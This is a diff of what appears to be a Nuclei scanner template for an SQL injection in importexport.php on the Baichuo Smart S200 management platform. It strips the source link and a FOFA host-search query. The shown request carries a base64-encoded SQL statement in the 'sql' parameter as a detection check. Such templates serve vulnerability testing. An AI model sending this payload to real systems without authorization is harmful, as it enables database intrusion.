@@ -3,12 +3,8 @@ info:
   name: 北京百绰智能s200管理平台 importexport.php sql注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xt6u3aiui8hidkxc'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xt6u3aiui8hidkxc
-    fofa: title="Smart管理平台"
 http:
 - raw:
   - 'GET /importexport.php?sql=c2VsZWN0IDEsbWQ1KDEwMjEwMzEyMik=&type=exportexcelbysql HTTP/1.1
